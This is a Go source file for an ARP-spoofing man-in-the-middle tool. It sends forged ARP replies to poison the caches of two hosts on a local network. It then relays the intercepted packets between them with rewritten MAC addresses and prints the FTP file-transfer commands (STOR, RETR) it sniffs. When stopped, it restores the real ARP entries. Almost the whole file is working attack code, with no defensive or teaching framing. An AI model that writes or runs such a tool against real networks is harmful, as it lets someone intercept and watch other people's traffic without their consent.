package main

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Addresses struct {
	attackerMac net.HardwareAddr
	srcMac net.HardwareAddr
	srcIP net.IP
	targetMac net.HardwareAddr
	targetIP net.IP
}

func main() {
	args := os.Args[1:]
	if len(args) < 4 {
		log.Fatal("Error: not enough arguments\n")
		return
	}
	for i := 0; i < len(args); i++ {
		if args[i] == "" {
			log.Fatal("Error: invalid argument\n")
			return
		}
	}

	srcIp := net.ParseIP(args[0])
	if srcIp == nil {
		log.Fatal("Error: wrong srcIP\n")
		return
	}
	targetIp := net.ParseIP(args[2])
	if targetIp == nil {
		log.Fatal("Error: wrong targetIp\n")
		return
	}
	srcMac, err := net.ParseMAC(args[1])
	if err != nil {
		log.Fatal("Error: wrong srcMac\n")
		return
	}
	targetMac, err := net.ParseMAC(args[3])
	if err != nil {
		log.Fatalf("Error: wrong targetMac: %v\n", err)
		return
	}

	attackerMacStr, err := net.InterfaceByName("enp0s1")
	if err != nil {
		log.Fatalf("Error: cannot get attacker's address: %v\n", err)
		return
	}
	attackerMac := attackerMacStr.HardwareAddr

	h, err := pcap.OpenLive("enp0s1", 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error: cannot open interface: %v\n", err)
		return
	}
	defer h.Close()

	ctx, cancel := context.WithCancel(context.Background())
	go sendARPReplies(ctx, h, attackerMac, srcIp, srcMac, targetIp)
	go sendARPReplies(ctx, h, attackerMac, targetIp, targetMac, srcIp)

	addresses := Addresses {
		attackerMac: attackerMac,
		srcMac: srcMac,
		srcIP: srcIp.To4(),
		targetMac: targetMac,
		targetIP: targetIp.To4(),
	}
	go monitorAndModifyFTP(h, addresses)

	waitForCtrlC()
	cancel()

	time.Sleep(1 * time.Second)

	go sendRestoredReply(h, targetMac, targetIp, srcMac, srcIp)
	go sendRestoredReply(h, srcMac, srcIp, targetMac, targetIp)

	time.Sleep(1 * time.Second)
}

func waitForCtrlC() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGINT)
	// Block until a signal is received
	<-c
}

func sendRestoredReply(h *pcap.Handle, victimMac net.HardwareAddr, victimIp net.IP, senderMac net.HardwareAddr, senderIp net.IP) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       victimMac,
		DstMAC:       senderMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   victimMac,
		SourceProtAddress: victimIp.To4(),
		DstHwAddress:      senderMac,
		DstProtAddress:    senderIp.To4(),
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}

	err := gopacket.SerializeLayers(buffer, opts, ethLayer, arpLayer)
	if err != nil {
		log.Fatalf("Error serializing ARP reply: %v", err)
		return
	}

	err = h.WritePacketData(buffer.Bytes())
	if err != nil {
		log.Fatalf("Error sending ARP reply: %v", err)
		return
	}
}

func sendARPReplies(ctx context.Context, h *pcap.Handle, attackerMac net.HardwareAddr, senderIp net.IP,
	senderMac net.HardwareAddr, victimIp net.IP) {
	ethLayer := &layers.Ethernet{
		SrcMAC:       attackerMac,
		DstMAC:       senderMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   attackerMac,
		SourceProtAddress: victimIp.To4(),
		DstHwAddress:      senderMac,
		DstProtAddress:    senderIp.To4(),
	}

	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			buf := gopacket.NewSerializeBuffer()
			err := gopacket.SerializeLayers(buf, opts, ethLayer, arpLayer)
			if err != nil {
				log.Fatal(err)
			}

			err = h.WritePacketData(buf.Bytes())
			if err != nil {
				log.Fatal(err)
			}

			time.Sleep(2 * time.Second)
		}
	}
}

func monitorAndModifyFTP(h *pcap.Handle, addresses Addresses) {
	packetSource := gopacket.NewPacketSource(h, h.LinkType())
	for packet := range packetSource.Packets() {
		if linkLayer := packet.Layer(layers.LayerTypeARP); linkLayer != nil {
			continue
		}
		modifyAndForwardPacket(h, packet, addresses)
		displayFTPCommands(packet)
	}
}

func modifyAndForwardPacket(h *pcap.Handle, packet gopacket.Packet, addresses Addresses) {
	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethLayer == nil {
		log.Println("No Ethernet layer found in the packet")
		return
	}
	eth, _ := ethLayer.(*layers.Ethernet)
	
	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		log.Println("No IPv4 layer found in the packet")
		return
	}
	ipv4, _ := ipLayer.(*layers.IPv4)

	// Determine direction and modify MAC address accordingly
	//if eth.SrcMAC.String() == srcMac.String() {
	if bytes.Equal(ipv4.SrcIP, addresses.srcIP) && bytes.Equal(ipv4.DstIP, addresses.targetIP) {
		eth.DstMAC = addresses.targetMac
		eth.SrcMAC = addresses.attackerMac
	//} else if eth.SrcMAC.String() == targetMac.String() {
	} else if bytes.Equal(ipv4.SrcIP, addresses.targetIP) && bytes.Equal(ipv4.DstIP, addresses.srcIP) {
		eth.DstMAC = addresses.srcMac
		eth.SrcMAC = addresses.attackerMac
	} else {
		log.Println("Packet is not from/to the specified source/target")
		return
	}

	// Serialize packet
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{FixLengths: false, ComputeChecksums: false}
	if err := gopacket.SerializePacket(buffer, options, packet); err != nil {
		log.Fatalf("Modify and forward: failed to serialize packet: %v", err)
	}

	// Send packet
	if err := h.WritePacketData(buffer.Bytes()); err != nil {
		log.Fatalf("Failed to send packet: %v", err)
	}

	log.Println("Packet modified and sent")
}

func displayFTPCommands(packet gopacket.Packet) {
	if appLayer := packet.ApplicationLayer(); appLayer != nil {
		payload := string(appLayer.Payload())
		lines := strings.Split(payload, "\r\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "STOR ") || strings.HasPrefix(line, "RETR ") {
				fmt.Println(line)
			}
		}
	}
}
